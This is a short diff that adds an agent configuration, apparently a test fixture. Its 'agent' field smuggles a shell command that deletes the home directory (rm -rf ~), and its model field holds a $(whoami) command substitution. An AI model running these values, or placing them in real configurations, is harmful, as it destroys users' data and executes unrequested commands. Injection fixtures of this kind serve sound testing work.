@@ -1,0 +1,4 @@
+agent: "claude`; rm -rf ~ #"
+agent_config:
+  claude:
+    model: $(whoami)
